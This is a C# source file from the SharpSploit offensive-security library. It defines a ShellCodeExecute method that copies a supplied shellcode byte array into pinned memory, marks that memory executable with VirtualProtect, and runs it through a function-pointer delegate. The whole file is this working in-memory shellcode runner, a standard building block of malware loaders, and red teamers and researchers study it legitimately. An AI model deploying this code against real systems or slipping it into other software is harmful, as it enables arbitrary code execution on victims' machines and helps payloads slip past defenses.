// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Runtime.InteropServices;

namespace SharpSploit.Execution
{
    /// <summary>
    /// ShellCode includes a method for executing shellcode.
    /// </summary>
    public class ShellCode
    {
        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Run();

        /// <summary>
        /// Executes a specified ShellCode byte array by copying it to pinned memory, modifying the memory
        /// permissions with VirtualProtect(), and executing using a delegate.
        /// </summary>
        /// <param name="ShellCode">ShellCode byte array to execute.</param>
        /// <returns>Boolean. True if execution succeeds, false otherwise.</returns>
        /// <remarks>Based upon code written by Matt Nelson (@enigma0x3) and Matt Graeber (@mattifestation).</remarks>
        public static bool ShellCodeExecute(byte[] ShellCode)
        {
            try
            {
                GCHandle pinnedArray = GCHandle.Alloc(ShellCode, GCHandleType.Pinned);
                IntPtr ptr = pinnedArray.AddrOfPinnedObject();
                Marshal.Copy(ShellCode, 0, ptr, ShellCode.Length);

                uint flOldProtect = 0;
                if (!Win32.Kernel32.VirtualProtect(ptr, (UIntPtr)ShellCode.Length, 0x40, out flOldProtect))
                {
                    return false;
                }
                Run del = (Run)Marshal.GetDelegateForFunctionPointer(ptr, typeof(Run));
                del();
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("ShellCodeExecute exception: " + e.Message);
            }
            return false;
        }
    }
}
